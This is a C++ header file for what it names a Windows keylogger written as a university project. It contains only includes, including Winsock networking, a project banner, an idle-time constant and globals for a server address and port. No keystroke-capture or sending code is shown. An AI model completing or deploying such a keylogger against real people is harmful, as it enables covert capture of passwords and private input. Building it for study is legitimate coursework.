#pragma once

#ifndef __cplusplus
    #error A C++ compiler is required!
#endif

#define PROJECT_NAME "Windows Keylogger for a University Project"
#define PROJECT_COPYRIGHT "Copyright (C) 2022 - Antonio Scardace"

#include <Windows.h>

#include <Winsock.h>
#include <Ws2tcpip.h>

#include <string>
#include <sstream>
#include <algorithm>
#include <iostream>
#include <fstream>

#include <ctime>
#include <cstdlib>
#include <cstdio>

using namespace std;

const DWORD IDLE_TIME {60 * 1000};   // 1 minute

string SERVER_ADDR;
unsigned int PORT;